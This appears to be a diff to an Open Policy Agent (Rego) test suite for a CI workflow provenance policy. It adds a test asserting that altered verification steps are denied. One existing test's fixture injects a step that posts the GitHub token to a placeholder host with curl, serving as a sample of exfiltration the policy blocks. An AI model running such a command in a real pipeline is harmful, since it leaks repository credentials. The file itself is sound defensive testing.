@@ -612,6 +612,26 @@ test_rejects_native_receipt_provenance_with_changed_verification_base if {
 	contains(msg, "must not use pull_request_target")
 }
 
+test_rejects_native_receipt_provenance_without_merged_event_identity_or_premerge_base if {
+	base := native_receipt_provenance_fixture
+	approved_run := base.jobs.verify.steps[1].run
+	every unsafe_run in [
+		replace(approved_run, `verification_base_sha="$(python3 -I scripts/ci/harbor-native-chainguard-receipt-import.py event-base \
+    --event-file "$GITHUB_EVENT_PATH" --base-sha "$base_sha" --token-file "$token_file")"`, `verification_base_sha="$(jq -er '.pull_request.base.sha' "$GITHUB_EVENT_PATH")"`),
+		replace(approved_run, "--base-sha \"$verification_base_sha\" --head-sha \"$head_sha\"", "--base-sha \"$base_sha\" --head-sha \"$head_sha\""),
+	] {
+		unsafe_run != approved_run
+		steps := [
+			base.jobs.verify.steps[0],
+			object.union(base.jobs.verify.steps[1], {"run": unsafe_run}),
+		]
+		workflow := object.union(base, {"jobs": {"verify": object.union(base.jobs.verify, {"steps": steps})}})
+		violations := deny with input as workflow
+		some msg in violations
+		contains(msg, "must not use pull_request_target")
+	}
+}
+
 test_rejects_native_receipt_provenance_with_extra_step if {
 	base := native_receipt_provenance_fixture
 	steps := array.concat(base.jobs.verify.steps, [{"run": "curl --data '${{ github.token }}' https://example.invalid"}])
